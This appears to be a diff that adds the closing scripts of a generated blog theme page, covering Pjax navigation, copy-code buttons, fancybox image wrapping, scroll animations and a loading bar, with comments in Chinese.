+        $(".highlight .code pre").before(copyHtml);
+        $(".article pre code").before(copyHtml);
+        clipboard.off('success').on('success', function (e) {
+            let $btn = $(e.trigger);
+            $btn.addClass('copied');
+            let $icon = $($btn.find('i'));
+            $icon.removeClass('fa-copy');
+            $icon.addClass('fa-check-circle');
+            let $span = $($btn.find('span'));
+            $span[0].innerText = 'COPIED';
+            wait(function () {
+                $icon.removeClass('fa-check-circle');
+                $icon.addClass('fa-copy');
+                $span[0].innerText = 'COPY'
+            }, 2000)
+        });
+        clipboard.off('error').on('error', function (e) {
+            e.clearSelection();
+            let $btn = $(e.trigger);
+            $btn.addClass('copy-failed');
+            let $icon = $($btn.find('i'));
+            $icon.removeClass('fa-copy');
+            $icon.addClass('fa-times-circle');
+            let $span = $($btn.find('span'));
+            $span[0].innerText = 'COPY FAILED';
+            wait(function () {
+                $icon.removeClass('fa-times-circle');
+                $icon.addClass('fa-copy');
+                $span[0].innerText = 'COPY'
+            }, 2000)
+        })
+    }
+    $(function () {
+        pjax_initCopyCode()
+    });
+</script>
+
+
+<!-- scrollreveal -->
+
+  <script src="/static/js-css/scrollreveal.min.js"></script>
+  <script type="text/javascript">
+    function pjax_scrollrebeal() {
+      ScrollReveal().reveal('.l_main .reveal', {
+        distance: '32px',
+        duration: '800',
+        interval: '20',
+        scale: '1',
+        easing: 'ease-out'
+      });
+    }
+
+    $(function () {
+      pjax_scrollrebeal();
+    });
+  </script>
+
+<!-- ******************************** -->
+
+<!-- fancybox -->
+<script src="/static/js-css/jquery.fancybox.min.js"></script>
+<script>
+  function pjax_fancybox() {
+    $(".article-entry").find("img").not('.inline').not('a img').each(function () { //渲染 fancybox
+      var element = document.createElement("a"); // a 标签
+      $(element).attr("class", "fancybox");
+      $(element).attr("pjax-fancybox", "");  // 过滤 pjax
+      $(element).attr("href", $(this).attr("src"));
+      if ($(this).attr("data-original")) {
+        $(element).attr("href", $(this).attr("data-original"));
+      }
+      $(element).attr("data-fancybox", "images");
+      var caption = "";   // 描述信息
+      if ($(this).attr('alt')) {  // 判断当前页面是否存在描述信息
+        $(element).attr('data-caption', $(this).attr('alt'));
+        caption = $(this).attr('alt');
+      }
+      var div = document.createElement("div");
+      $(div).addClass("fancybox");
+      $(this).wrap(div); // 最外层套 div ，其实主要作用还是 class 样式
+      var span = document.createElement("span");
+      $(span).addClass("image-caption");
+      $(span).text(caption); // 加描述
+      $(this).after(span);  // 再套一层描述
+      $(this).wrap(element);  // 最后套 a 标签
+    })
+    $(".article-entry").find("img").fancybox({
+      selector: '[data-fancybox="images"]',
+      hash: false,
+      loop: false,
+      closeClick: true,
+      helpers: {
+        overlay: {closeClick: true}
+      },
+      buttons: [
+        "zoom",
+        "close"
+      ]
+    });
+  };
+  $(function () {
+    pjax_fancybox();
+  });
+</script>
+
+<!-- ******************************** -->
+
+
+  
+<script src="/js/app.js"></script>
+
+
+
+
+  
+    
+<script src="/js/search.js"></script>
+
+  
+
+
+
+  <script defer src="/static/js-css/busuanzi.pure.mini.js" data-pjax></script>
+
+
+
+  
+<script src="/static/js-css/waves.min.js"></script>
+
+  <script type="text/javascript">
+    $(function () {
+      Waves.attach('.flat-btn', ['waves-button']);
+      Waves.attach('.float-btn', ['waves-button', 'waves-float']);
+      Waves.attach('.float-btn-light', ['waves-button', 'waves-float', 'waves-light']);
+      Waves.attach('.flat-box', ['waves-block']);
+      Waves.attach('.float-box', ['waves-block', 'waves-float']);
+      Waves.attach('.waves-image');
+      Waves.init();
+    });
+  </script>
+
+
+
+  
+<script src="/static/js-css/comment_typing.js"></script>
+
+
+
+
+
+
+
+    
+      
+
+
+<script src="/static/js-css/pjax.min.js"></script>
+
+<!-- 样式位于：source/css/_third-party/pjaxanimate.styl -->
+
+<div class="pjax-animate">
+  
+    <script src="/static/js-css/nprogress.min.js"></script>
+    <div id="loading-bar-wrapper"><script>NProgress.configure({parent:"#loading-bar-wrapper",trickleSpeed: 100})</script></div>
+    <script>
+      window.ShowLoading = function() {
+        NProgress.start();
+      };
+      window.HideLoading = function() {
+        NProgress.done();
+      }
+    </script>
+  
+</div>
+
+<script>
+    var pjax;
+    document.addEventListener('DOMContentLoaded', function () {
+      pjax = new Pjax({
+        elements: 'a[href]:not([href^="#"]):not([href="javascript:void(0)"]):not([pjax-fancybox])',
+        selectors: [
+          "title",
+          "#pjax-container",
+          "#pjax-header-nav-list"
+        ],
+        cacheBust: false,   // url 地址追加时间戳，用以避免浏览器缓存
+        timeout: 5000
+      });
+    });
+
+    document.addEventListener('pjax:send', function (e) {
+      window.stop(); // 相当于点击了浏览器的停止按钮
+
+      try {
+        var currentUrl = window.location.pathname;
+        var targetUrl = e.triggerElement.href;
+        var banUrl = [""];
+        if (banUrl[0] != "") {
+          banUrl.forEach(item => {
+            if(currentUrl.indexOf(item) != -1 || targetUrl.indexOf(item) != -1) {
+              window.location.href = targetUrl;
+            }
+          });
+        }
+      } catch (error) {}
+
+      window.subData = null; // 移除标题（用于一二级导航栏切换处）
+      $.fancybox.close();    // 关闭弹窗
+      $('.l_header .switcher .s-search').removeClass('active'); // 关闭移动端激活的搜索框
+      $('.l_header').removeClass('z_search-open'); // 关闭移动端激活的搜索框
+      $('.wrapper').removeClass('sub'); // 跳转页面时关闭二级导航
+
+      // 解绑事件 避免重复监听
+      $('.s-top').unbind('click');
+      $('.menu a').unbind('click');
+      $(window).unbind('resize');
+      $(window).unbind('scroll');
+      $(document).unbind('scroll');
+      $(document).unbind('click');
+      $('body').unbind('click');
+      window.ShowLoading();
+    });
+
+    document.addEventListener('pjax:complete', function () {
+      // 关于百度统计对 SPA 页面的处理：
+      // 方案一：百度统计>管理>单页应用设置中，打开开启按钮即可对SPA进行统计。 https://tongji.baidu.com/web/help/article?id=324
+      // 方案二：取消注释下列代码。 https://tongji.baidu.com/web/help/article?id=235
+      // 
+
+      // 关于谷歌统计对 SPA 页面的处理：
+      // 当应用以动态方式加载内容并更新地址栏中的网址时，也应该更新通过 gtag.js 存储的网页网址。
+      // https://developers.google.cn/analytics/devguides/collection/gtagjs/single-page-applications?hl=zh-cn
+      
+
+      $('.nav-main').find('.list-v').not('.menu-phone').removeAttr("style",""); // 移除小尾巴的移除
+      $('.menu-phone.list-v').removeAttr("style",""); // 移除小尾巴的移除
+      $('script[data-pjax], .pjax-reload script').each(function () {
+        $(this).parent().append($(this).remove());
+      });
+
+      try{
+        pjax_fancybox();
+        
+          
+          if ('.cover') {
+            $('.cover').backstretch("resize");
+          } else {
+            $.backstretch("resize");
+          }
+        
+        
+        
+          pjax_scrollrebeal();
+        
+        
+          pjax_initCopyCode();
+        
+        
+          pjax_valine();
+        
+        
+        
+        
+        
+      } catch (e) {
+        console.log(e);
+      }
+      window.HideLoading();
+    });
+
+    document.addEventListener('pjax:error', function (e) {
+      window.HideLoading();
+      window.location.href = e.triggerElement.href;
+    });
+</script>
+
+    
+  </div>
+</body>
+</html>
